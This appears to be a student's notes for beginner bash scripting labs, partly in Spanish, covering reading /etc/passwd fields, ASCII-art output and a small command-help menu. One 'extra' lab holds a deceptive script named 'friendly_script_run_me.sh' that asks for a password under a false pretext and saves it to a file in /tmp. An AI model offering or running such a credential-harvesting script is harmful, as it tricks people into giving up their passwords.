
###? Lab 0920: Create a script presenting yourself: name, lastname, age, location, team, favorite food, animal(use variables if possible) and an animal with assic art (https://www.asciiart.eu/

###? Lab 0921: Create a script that shows your info from /etc/passwd, when you run the script the output should look like this:
# (hit... use: cat, grep, cut)
```
echo "this is your user info:"
echo "user name:"
cat /etc/passwd | grep nuc-esteban | cut -d: -f1
echo "your user ID number:"
cat /etc/passwd | grep nuc-esteban | cut -d: -f3
echo "your group ID number:"
cat /etc/passwd | grep nuc-esteban | cut -d: -f4
echo "your home directory:"
cat /etc/passwd | grep nuc-esteban | cut -d: -f6
echo "your shell is:"
cat /etc/passwd | grep nuc-esteban | cut -d: -f7
```
chmod +x myinfo
# display the content of the script in the terminal #!SS


###? Lab 0922: Create a script that ask the user a word and shows an animal with assic art (https://www.asciiart.eu/), saying it

sh animal.sh
```
#!/bin/bash
echo "que va a decir el oso?"
read respuesta


cat << 'EOF'
 __         __  
/  \.-"""-./  \  
\    -   -    /  
 |   o   o   |  
 \  .-'''-.  /  
  '-\__Y__/-'  
     `---`  
EOF
echo "$respuesta"


###? Lab 0923: EXTRA: create an script that steals password from other user and send it to "/tmp" in a text file.

nano friendly_script_run_me.sh
```
#!/bin/bash
echo "just to verify your ID please enter you password"

read -s password

echo "$USER $password" > /tmp/a_fools_password

echo "wish you the best day friend! we love you!!"
```


###? Lab 0924: EXTRA: create an script that ask u for a command and show your a quick explanation like "cheat.sh" but with 3 commands you find hard to remember

```
#!/bin/bash
echo "tengo ayudas para los comandos xargs, find y useradd, escriba el que quiera"

read respuesta

if [ "$respuesta" == "xargs" ]; then
echo "xargs info"
fi

if [ "$respuesta" == "find" ]; then
echo "find info"
fi

if [ "$respuesta" == "useradd" ]; then
echo "useradd info"
fi
```